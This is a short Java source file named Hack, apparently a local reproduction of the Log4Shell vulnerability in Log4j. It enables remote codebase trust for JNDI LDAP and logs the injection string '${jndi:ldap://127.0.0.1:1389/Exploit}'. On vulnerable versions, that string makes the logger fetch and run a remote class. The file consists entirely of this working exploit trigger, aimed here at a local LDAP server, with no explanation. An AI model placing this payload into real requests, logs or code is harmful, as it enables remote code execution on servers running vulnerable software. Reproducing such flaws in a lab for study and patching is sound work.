package cn.wxxlamp.client;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @author chenkai
 * @date 2021/12/11 15:6
 */
public class Hack {
    private static final Logger LOGGER = LogManager.getLogger(Hack.class);

    public static void main(String[] args)   {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        LOGGER.error("${jndi:ldap://127.0.0.1:1389/Exploit}");
    }
}
